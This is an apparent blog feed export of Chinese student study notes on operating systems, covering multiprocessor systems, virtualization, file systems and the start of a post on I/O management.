title="多处理器系统"></a>多处理器系统</h2><p>在一个计算机系统内部，两个以上的CPU共享对一个公共RAM都拥有的完全访问权限. 根据不同CPU读写速度的不同又分为</p><ol><li><p>UMA ( Uniform Memory Access ， 统一内存访问)</p><p>每个存储器字的读出速度是一样快的。 </p><p>主要有三种硬件实现</p><ol><li>Bus-Based Architectures 总线结构</li><li>Crossbar Switches  交叉开关</li><li>Multistage Switching Networks  多级交换网络</li></ol></li><li><p>NUMA ( Nonuniform Memory Access， 非统一内存 访问 )</p><p>存储器访问时间取决于相对于处理器的存储器位置.</p><p>访问远程存储器的速度比本地存储器慢</p></li></ol><h3 id="UMA-的硬件实现"><a href="#UMA-的硬件实现" class="headerlink" title="UMA 的硬件实现"></a>UMA 的硬件实现</h3><p><em><u>了解</u></em></p><h4 id="总线结构"><a href="#总线结构" class="headerlink" title="总线结构"></a>总线结构</h4><p>字面意思, 每个CPU通过总线与内存交互. 又可分为三种:</p><ol><li>不带独立cache</li><li>拥有独立cache</li><li>拥有独立cache和私有内存</li></ol><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%89%E7%A7%8D%E6%80%BB%E7%BA%BF.png" alt=""></p><p>问题: CPU会争夺总线的使用权, 引起<strong>竞争</strong>.</p><h4 id="交叉开关"><a href="#交叉开关" class="headerlink" title="交叉开关"></a>交叉开关</h4><p>对于 $n$ 个CPU 构建 $n\times n$ 的交叉开关网络. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%BA%A4%E5%8F%89%E5%BC%80%E5%85%B3.png" alt=""></p><p>优点: 绝对不会竞争或阻塞</p><p>缺点: 开销过大</p><h4 id="多级交换网络"><a href="#多级交换网络" class="headerlink" title="多级交换网络"></a>多级交换网络</h4><p>使用 2*2 的交换机来构建多级交换网络.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E5%A4%9A%E7%BA%A7%E4%BA%A4%E6%8D%A2.png" alt=""></p><p>上图是三级交换网络, 对于 $n$ 个CPU, 仅需要 $3\times \frac n 2$ 个交换机. 同时每个线路的可通达度大幅提高了.</p><h3 id="OS-划分类型"><a href="#OS-划分类型" class="headerlink" title="OS 划分类型"></a>OS 划分类型</h3><h4 id="类型１-每个CPU都有自己的OS"><a href="#类型１-每个CPU都有自己的OS" class="headerlink" title="类型１: 每个CPU都有自己的OS"></a>类型１: 每个CPU都有自己的OS</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E7%8B%AC%E8%87%AA1.png" alt=""></p><ul><li>内存划分为n个部分</li><li>为每个CPU分配自己的专用内存和操作系统的专用副本</li><li>OS每个操作系统都有自己的表，不共享进程；<br>没有共享页面</li></ul><h4 id="类型2-主从处理器"><a href="#类型2-主从处理器" class="headerlink" title="类型2: 主从处理器"></a>类型2: 主从处理器</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%BB%E4%BB%8E2.png" alt=""></p><ul><li>OS及其表的一个副本位于CPU1上</li><li>所有系统调用都重定向到CPU1进行处理</li><li>缺点: 如果从处理器过多, 主处理器的性能将成为系统的瓶颈</li></ul><h4 id="类型3-对称处理器"><a href="#类型3-对称处理器" class="headerlink" title="类型3: 对称处理器"></a>类型3: 对称处理器</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E5%AF%B9%E7%A7%B03.png" alt=""></p><ul><li>内存中只有一个OS副本，但是任何CPU都可以运行它</li><li>使用互斥量(锁)保证只有一个处理器在使用OS </li></ul><h3 id="处理器的调度"><a href="#处理器的调度" class="headerlink" title="处理器的调度"></a>处理器的调度</h3><h4 id="分时调度-Timesharing"><a href="#分时调度-Timesharing" class="headerlink" title="分时调度 Timesharing"></a>分时调度 Timesharing</h4><p>Using a single data structure for scheduling a multiprocessor</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/time.png" alt=""></p><h4 id="分空间调度-Space-sharing"><a href="#分空间调度-Space-sharing" class="headerlink" title="分空间调度 Space sharing"></a>分空间调度 Space sharing</h4><p>multiple threads at same time across multiple CPUs</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/space.png" alt=""></p><h4 id="Gang-Scheduling-（-群调度-）"><a href="#Gang-Scheduling-（-群调度-）" class="headerlink" title="Gang Scheduling （ 群调度 ）"></a>Gang Scheduling （ 群调度 ）</h4><ol><li>Groups of related threads scheduled as a unit (a gang)</li><li>All members of gang run simultaneously （ 同时 ） on different timeshared CPUs </li><li>All gang members start and end time slices together</li></ol><p><em>其他的应该不是重点</em></p><hr><h2 id="多计算机系统"><a href="#多计算机系统" class="headerlink" title="多计算机系统"></a>多计算机系统</h2><p>一言以蔽之: <u>不共享内存的紧密耦合CPU</u></p><p>又称为cluster computers (群集计算机) , clusters of workstations (群集工作站,COW)</p><p>每个CPU的内存连接在自己的CPU上并且不会被其他CPU访问到. </p><p><em>本节不是重点</em></p><h3 id="互联拓扑结构"><a href="#互联拓扑结构" class="headerlink" title="互联拓扑结构"></a>互联拓扑结构</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%BA%92%E8%81%94%E6%8B%93%E6%89%91.png" alt=""></p><p>星型; 环型; 网格; 双环; 立方; 超立方</p><h3 id="存储转发分组交换"><a href="#存储转发分组交换" class="headerlink" title="存储转发分组交换"></a><strong>存储转发分组交换</strong></h3><h3 id="其他链接方式"><a href="#其他链接方式" class="headerlink" title="其他链接方式"></a><strong>其他链接方式</strong></h3><p>电路交换</p><p>虫孔路由</p><p>…</p><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><ul><li>根据计算能力的需要，可能需要在多台刀片服务器上部署 应用，即分布式应用部署。</li><li>为了在这个分布式计算环境上，给最终用户一个集成的开 发环境，让用户感觉是在一台计算机上进行编程一样，底 层多台刀片服务器之间需要使用远程过程调用RPC。</li><li>选型RPC 框架时，主要考虑三个关键方面：传输协议与数 据类型（JSON、XML 等），数据的存储、传输效率，服 务器端对数据的请求方式。</li></ul><hr><h2 id="虚拟化⭐"><a href="#虚拟化⭐" class="headerlink" title="虚拟化⭐"></a>虚拟化⭐</h2><p>虚拟机技术，通常简称为 <strong>虚拟化</strong> virtualization 。<br>该技术允许一台计算机托管多个虚拟机，每个虚拟机可能运行不同的操作系统。</p><p>优点:</p><ul><li>一个虚拟机的故障不会自动导致其他任何故障。 </li><li>拥有更少的物理机可以节省硬件成本并占用更少的空间</li><li>检查点和迁移虚拟机比普通的要容易得多</li><li>在不再受支持或无法在当前硬件上运行的操作系统上运行旧版应用程序</li><li>在软件开发时确保软件可以在不同的OS上运行。</li></ul><p><strong>Hypervisor</strong>, also called Virtual Machine Monitor (VMM, 虚拟机监视器)它是在硬件层之上，独立于操作系统的一层软件。创建虚拟化平台，OS实例运行在这个平台上，使得硬件可以被多个OS和应用共享.</p><p><em><u>搞清楚几种的区别</u></em></p><h3 id="Type-1-Hypervisor"><a href="#Type-1-Hypervisor" class="headerlink" title="Type 1 Hypervisor"></a>Type 1 Hypervisor</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E8%99%9A%E6%8B%9F%E5%8C%961.png" alt=""></p><ul><li>Hypervisor 直接运行在硬件之上, 其余的OS运行在Hypervisor 上.</li><li>但是OS都以为自己在内核上 (实际是用户态)</li><li>被称为 <strong>虚拟内核态</strong> (virtual kernel mode)</li><li>例如: Hyper-V, Xen, Vmware vSphere</li></ul><h3 id="Type-2-Hypervisors"><a href="#Type-2-Hypervisors" class="headerlink" title="Type 2 Hypervisors"></a>Type 2 Hypervisors</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E8%99%9A%E6%8B%9F%E5%8C%962.png" alt=""></p><ul><li>主OS运行在硬件上, Hypervisor 运行在主OS上, 其余OS 运行在Hypervisor 上.</li><li>当虚拟OS第一次启动时, Hypervisor 引导它们安装在虚拟磁盘上</li><li>例如:  Vmware worksation, Parallels, VM virtualBox</li></ul><h3 id="Paravirtualization-半虚拟化"><a href="#Paravirtualization-半虚拟化" class="headerlink" title="Paravirtualization  半虚拟化"></a>Paravirtualization  半虚拟化</h3><p>修改来宾操作系统的源代码，以便根本不执行敏感指令，而进行 <strong>hypervisor calls</strong>.</p><p>Hypervisor 定义接口，该接口由guest操作系统可以使用的一组过程调用组成（API）.</p><p>这种限制guest操作系统敏感操作的方式称为 <strong>半虚拟化</strong> (paravirtualized)</p><hr><h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><p><em>不是重点</em></p><p>使用中间件技术实现一致性.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%AD%E9%97%B4%E4%BB%B6.png" alt=""></p><hr><p><strong>操作系统系列</strong></p><ol><li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li><li>操作系统之多处理器系统 (本文)</li><li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章将会涉及:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;多处理器系统&lt;/li&gt;
&lt;li&gt;多计算机系统&lt;/li&gt;
&lt;li&gt;虚拟化&lt;/li&gt;
&lt;li&gt;分布式&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之文件系统</title>
    <link href="http://yoursite.com/2020/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoursite.com/2020/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-08-06T08:27:07.000Z</published>
    <updated>2020-08-15T11:05:18.531Z</updated>
    
    <content type="html"><![CDATA[<p>本章将会涉及:</p><ol><li>文件</li><li>目录</li><li>文件系统的实现</li></ol><a id="more"></a><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>在进程的运行过程中出现了以下需求: 1) 需要储存大量信息; 2)信息需要保存至进程结束后; 3) 多个进程需要同时对数据进行操作.</p><p>为了解决以上问题, 我们将信息存储在磁盘和其他外部介质中, 称之为 <strong>文件</strong>.</p><h3 id="文件命名"><a href="#文件命名" class="headerlink" title="文件命名"></a>文件命名</h3><p>文件的命名要求因操作系统而已. </p><p>有的系统区分文件的大小写, 有的则不区分(MS-DOS).</p><p>许多OS使用字符<code>.</code>将文件名分成两部分, 后半部分称为 <strong>文件后缀名</strong>(file extension)</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E5%90%8E%E7%BC%80.png" alt=""></p><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>文件有多种组成结构</p><ol><li>byte sequence  文件由字节序列组成 (UNIX和WIN都是如此)</li><li>record sequence 文件由记录片组成(早期插卡式系统)</li><li>tree 树型 文件是一层层地储存的</li></ol><h3 id="文件分类"><a href="#文件分类" class="headerlink" title="文件分类"></a>文件分类</h3><p>由使用用途</p><ul><li>系统文件</li><li>用户文件</li><li>库文件</li></ul><p>由数据形式</p><ul><li>源文件</li><li>目标文件</li><li>可执行文件</li></ul><p>由权限</p><ul><li>只可执行文件</li><li>只读</li><li>读写</li></ul><p>由逻辑结构</p><ul><li>结构化数据</li><li>非结构化数据</li></ul><p>由(在硬盘上储存的)物理结构</p><ul><li>顺序文件</li><li>连接文件</li><li>索引文件</li></ul><p>UNIX和WIN都有常规文件和目录文件</p><p>UNIX中还有 字符设备文件 和块设备文件, 进程文件(伪文件)等特殊文件.</p><h3 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h3><ul><li><p>顺序访问</p><p>只能从最开始访问</p><p>不能跳转</p></li><li><p>随机访问</p><p>以任意顺序访问</p></li></ul><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><p>文件包括很多属性,见图</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7.png" alt=""></p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul><li>创建</li><li>删除</li><li>打开</li><li>关闭</li><li>读</li><li>写</li><li>追加</li><li>查找</li><li>访问属性</li><li>设定属性</li><li>重命名</li></ul><hr><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="目录系统的种类"><a href="#目录系统的种类" class="headerlink" title="目录系统的种类"></a>目录系统的种类</h3><ul><li><p>单层析目录</p><p>ROOT 下直接跟随各种文件</p></li><li><p>双层次目录</p><p>ROOT 下由用户创建文件夹, 并在文件夹中储存文件</p></li><li><p>多层次目录</p><p>ROOT 下由用户创建文件夹, 并在文件夹中储存文件或文件夹</p></li></ul><h3 id="路径-⭐"><a href="#路径-⭐" class="headerlink" title="路径 ⭐"></a>路径 ⭐</h3><p>假设文件层次如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root:</span><br><span class="line">├─other1</span><br><span class="line">└─usr</span><br><span class="line">    ├─ast</span><br><span class="line">    │  ├─mailbox</span><br><span class="line">    │  ├─myInfo.txt</span><br><span class="line">    │  └─other3</span><br><span class="line">    └─other2</span><br></pre></td></tr></table></figure><p>假设当前位于<code>ast</code>目录</p><ul><li><p>Absolute path name </p><p>绝对路径(从根目录起) 前加 <code>/</code> </p><ul><li><code>/usr/ast/mailbox</code> (UNIX)   访问mailbox文件夹</li><li><code>/usr/ast/myInfo.txt</code> (UNIX)   访问myInfo.txt</li><li><code>\usr\ast\mailbox</code> (Win)    访问mailbox文件夹</li></ul></li><li><p>Relative path name</p><p>相对目录(从当前目录开始) </p><ul><li><code>mailbox</code>    访问mailbox文件夹</li><li><code>./myInfo.txt</code> 访问myInfo.txt</li></ul><p>如访问当前目录的可执行文件，如果用相对路径必须是 ./filename</p></li><li><p>Working directory ( current directory) </p><ul><li><code>/usr/ast</code> 表示当前目录</li></ul></li></ul><h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><ul><li>Create</li><li>Delete</li><li>Opendir</li><li>Closedir</li><li>Readdir</li><li>Rename</li><li>Link(hard link/symbol link)</li><li>Unlink</li></ul><hr><h2 id="文件系统的实现"><a href="#文件系统的实现" class="headerlink" title="文件系统的实现"></a>文件系统的实现</h2><h3 id="文件系统布局"><a href="#文件系统布局" class="headerlink" title="文件系统布局"></a>文件系统布局</h3><p>文件都是储存在磁盘上的. 大多数磁盘都分为一个或多个区(Partitions) ,  每个区都有自己的独立文件系统.</p><p>磁盘的0扇区被称为 <strong>主引导区</strong> <strong>MBR</strong> (Master Boot Record) , 用于引导计算机启动.</p><blockquote><p> Sector 0 of the disk is called MBR (Master Boot Record) and is used to boot the computer.</p></blockquote><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B8%83%E5%B1%80.png" alt=""></p><ul><li>Partition table: 给出每个分区开始结束的地址信息gives the starting and ending addresses of each partition. </li><li>Boot block: locate the active partition </li><li>Superblock: magic number, number of blocks, … </li><li>Free space mgmt: 使用位图/链表储存文件的空余信息</li><li>i-nodes: an array of data structure, one per file. </li><li>后面的部分就是真正的文件和目录内容了</li></ul><h3 id="文件的实现"><a href="#文件的实现" class="headerlink" title="文件的实现"></a>文件的实现</h3><ul><li>顺序存放</li><li>链接存放</li><li>使用FAT在内存中链接存放 </li><li>I-Node ⭐</li></ul><h4 id="顺序存放"><a href="#顺序存放" class="headerlink" title="顺序存放"></a>顺序存放</h4><p>就是顺序存放.</p><p>优点:</p><ul><li>简单</li><li>读的性能非常高效</li></ul><p>缺点</p><ul><li>文件如果后续需要删除, 重写会造成大量碎片</li></ul><p>常用于后续不会再写入数据. 如CD</p><h4 id="链接存放"><a href="#链接存放" class="headerlink" title="链接存放"></a>链接存放</h4><p>每个文件都指明下一个文件的指针</p><p>缺点: 随机访问非常非常慢, 找一个文件要从头找</p><h4 id="使用FAT在内存中链接存放⭐"><a href="#使用FAT在内存中链接存放⭐" class="headerlink" title="使用FAT在内存中链接存放⭐"></a>使用FAT在内存中链接存放⭐</h4><p>将文件的链接关系放在一张表中, 称为 <strong>文件分配表</strong> (( File Allocation Table), FAT) </p><p>缺点: 需要将整个文件系统的表(通常很大)载入内存.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/FAT.png" alt=""></p><h4 id="I-Node-⭐"><a href="#I-Node-⭐" class="headerlink" title="I-Node ⭐"></a>I-Node ⭐</h4><p>给每个文件赋予一个相关联的数据结构, 称为 <strong>索引节点</strong>（I-Node , index-node），该数据结构列出了文件块的<strong>属性</strong>和<strong>磁盘地址</strong>。仅在访问本文件时, 才需要将节点载入内存.</p><p>也有可能储存文件的磁盘地址比较多, 可以再指向另外一个储存地址的地址</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/inode.png" alt=""></p><h3 id="目录的实现"><a href="#目录的实现" class="headerlink" title="目录的实现"></a>目录的实现</h3><p>目录系统的主要功能是<strong>将文件的ASCII名称映射到定位数据所需的信息</strong>上。</p><p>Windows 系统给每个条目都分配了定长的数据段, 来保存文件的属性. </p><p>UNIX 系统给每个条目分配一个I-node的引用</p><h3 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h3><p>UNIX 提供共享文件的机制. 出现在多用户下.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6.png" alt=""></p><p>C的一个文件出现在B的目录下。B的目录与该共享的联系称为一个连接 LINK.</p><p>问题：若目录中包含磁盘地址，则连接文件时，C目录的磁盘地址复制到B目录<br>中，若B或C后又加内容，则新的数据块只会列入进行添加工作的目录中。</p><h4 id="hard-link"><a href="#hard-link" class="headerlink" title="hard link"></a><strong>hard link</strong></h4><p>（硬连接或者实际连接）</p><p>由于Linux里面每个文件都对应一个inode，而文件名是记录在目录的block里的，也就是说文件名和inode没有关系，这样就可以把多个文件名对应同一个inode，这就是hard link，简单的说：hard link只是在某个目录下新建一条文件名连接到某inode号码的关联记录而已。</p><p>缺点</p><ul><li>不能够跨文件系统地做硬连接</li><li>不能够连接到目录</li></ul><h4 id="symbolic-link"><a href="#symbolic-link" class="headerlink" title="symbolic link"></a><strong>symbolic link</strong></h4><p>软连接或者符号连接</p><p>软连接创建一个新的文件，有自己的inode和block，只是在block里记录的是到连接目标文件的指向，读取到这个指向记录以后，系统再从根目录一层层进到目标文件的block里把数据读出来</p><p>symbolic link有如下特点：</p><p>1.等于是文件的一个“快捷方式”，只起一个指向作用</p><p>2.是一个独立的新文件，对目标文件没有任何影响</p><p>3.目标文件一旦删除，软连接会打不开</p><p>两种连接方式都存在的问题: 查找文件时会将同一个文件重复查询.</p><h3 id="Linux虚拟文件系统VFS"><a href="#Linux虚拟文件系统VFS" class="headerlink" title="Linux虚拟文件系统VFS"></a>Linux虚拟文件系统VFS</h3><p> 整个 Linux 系统通过 Virtual Filesystem Switch 的核心功能去 读取 filesystem。整个 Linux 认识的 filesystem 都是 VFS 在 进行管理，使用者并不需要知道每个 partition 的 filesystem 是什么</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/VFS.png" alt=""></p><p><em><u>其他了解即可</u></em></p><hr><p><strong>操作系统系列</strong></p><ol><li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li><li>操作系统之文件系统 (本文)</li><li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章将会涉及:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;文件&lt;/li&gt;
&lt;li&gt;目录&lt;/li&gt;
&lt;li&gt;文件系统的实现&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之IO管理</title>
    <link href="http://yoursite.com/2020/08/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BIO%E7%AE%A1%E7%90%86/"/>
    <id>http://yoursite.com/2020/08/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BIO%E7%AE%A1%E7%90%86/</id>
    <published>2020-08-05T13:08:03.000Z</published>
    <updated>2020-08-17T10:39:09.256Z</updated>
    
    <content type="html"><![CDATA[<p>本章将涉及: </p><ol><li>IO设备</li><li>盘</li><li>时钟</li><li>其他</li></ol><p><em>本文匆匆赶制, 内容粗糙简陋  <del>背就完事了</del></em> </p><a id="more"></a><h2 id="IO设备"><a href="#IO设备" class="headerlink" title="IO设备"></a>IO设备</h2><h3 id="IO设备分类-⭐"><a href="#IO设备分类-⭐" class="headerlink" title="IO设备分类 ⭐"></a>IO设备分类 ⭐</h3><ul><li>块设备 (Block device)<ul><li>储存于固定大小的块中, 每块都有自己的地址</li><li>每个块都可以可以独立于其他块进行读写</li><li>例如: 磁盘</li></ul></li><li>字符设备 ( Character device )<ul><li>使用字符流进行传递</li><li>不可寻址, 没有任何查找功能</li><li>例如: 打印机, 键鼠</li></ul></li><li>其他<ul><li>时钟</li></ul></li></ul><p><em>我们接下来的讨论一般是针对块设备</em></p><h3 id="IO-设备部组成"><a href="#IO-设备部组成" class="headerlink" title="IO 设备部组成"></a>IO 设备部组成</h3><ul><li>机械部件(即普遍意义上的设备)</li><li>电子部件</li></ul><p>其中电子部件是用于控制管理机械部件的, 我们将电子部件称为 <strong>设备控制器</strong> .它的主要功能是: </p><p><em><u>知道作用</u></em></p><ul><li><p>Convert the serial bit stream into a block of bytes </p><p>将串行字节流转化未字节块</p></li><li><p>Perform any error correction necessary </p><p>对于运行时可能的出错进行纠正</p></li><li><p>Copy it to main memory</p><p>将字节复制到主存</p></li></ul><p><em>注: 一个设备控制器可能同时负责多个机械设备</em></p><p>此外每个设备控制器都拥有一些寄存器用于与OS通信:</p><ul><li>OS通过写入寄存器来命令设备执行操作等</li><li>OS通过读取寄存器来获取设备的状态</li></ul><p>除了寄存器外, 许多设备还有OS可以读取/写入的数据缓冲区</p><h3 id="与OS的通信方式"><a href="#与OS的通信方式" class="headerlink" title="与OS的通信方式"></a>与OS的通信方式</h3><p>OS和控制器的通信可以分为三种方式 ⭐</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/mmio.png" alt=""></p><ol><li><p>独立空间</p><p>每个控制寄存器器都分配有一个单独的IO端口号</p><p>内存的地址空间和IO的地址空间完全独立</p></li><li><p>内存映射 </p><p>将所有的控制寄存器映射到内存空间.</p><p>这些被映射的内存空间不会被其他内存映射, 只能由控制寄存器使用</p><p><strong>优点</strong></p><ol><li>, a I/O device driver can be written entirely in C. Otherwise, some assembly code is needed</li><li>No special protection mechanism is needed to keep user processes from performing I/O.</li><li>Every instructions that can reference memory can also reference control registers.</li></ol></li><li><p>混合</p><p>IO数据缓冲区采用内存映射, 寄存器采用独立空间</p></li></ol><p>IO软件层次: 驱动</p><p>需要实现:</p><ul><li>设备独立性, 设备在接入前不需要任何特殊处理</li><li>统一命名</li><li>纠错(贴近硬件层, 不需要OS费心)</li><li>异步传输</li><li>缓冲区</li><li>共享设备&amp;专业设备</li></ul><h3 id="IO控制方式-⭐"><a href="#IO控制方式-⭐" class="headerlink" title="IO控制方式 ⭐"></a>IO控制方式 ⭐</h3><ol><li><p>程序控制IO  Programmed I/O </p><p>使用程序不断查询设备以了解是否就绪, 忙等待, 低效 浪费CPU</p></li><li><p>中断控制IO  Interrupt-Driven I/O </p><p>允许CPU在IO工作时干其他时, 当IO完毕时发出中断.</p><p>问题在于IO每次只能传输一个字符, 中断频率过高</p></li><li><p>DMA控制IO⭐  I/O Using DMA </p><p>DMA控制器Direct Memory Access 是一个能够独立于CPU访问系统总线的控制器, 相当于一个字符缓冲池, 当缓冲池满了再向CPU发出中断信号.</p><blockquote><p>DMA controller <strong>has access to the system bus independent of the CPU</strong>. It contains several registers that can be written and read by the CPU</p></blockquote><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/dmA.png" alt=""></p><ol><li>CPU向DMA发出指令(而后CPU继续运行其他进程)</li><li>DMA向IO控制器发送传输指令</li><li>IO控制器与存储单元传输数据</li><li>传输控制器回应DMA</li><li>DMA向CPU发出IO中断信号(CPU处理)</li></ol></li></ol><h3 id="IO软件层次"><a href="#IO软件层次" class="headerlink" title="IO软件层次"></a>IO软件层次</h3><p>中断处理</p><p>最好是隐藏的, 不被感知. </p><p>一般需要大量时间, 负责设备与设备驱动之间的通信.</p><p>设备驱动器</p><p>设备独立性 : 设备在接入前不需要任何特殊处理</p><p>统一接口</p><p>缓冲区</p><p>​    双BUFFER区(乒乓机制)</p><h2 id="盘"><a href="#盘" class="headerlink" title="盘"></a>盘</h2><ol><li><p>每个byte由 14个bits构成</p></li><li><p>每42个byte构成1个帧(frame)</p><p>但是每frame种只有24byte用于记录数据, 剩下的用于校验和控制</p></li><li><p>98个帧构成扇区sector </p><p>每个扇区有16byte的引导符preamble, 后面又有288byte的ECC(纠错)</p></li></ol><p>柱面斜进, 每圈的零扇区在磁盘上不是位于同一条直线上.</p><p>磁盘交错. </p><p><img 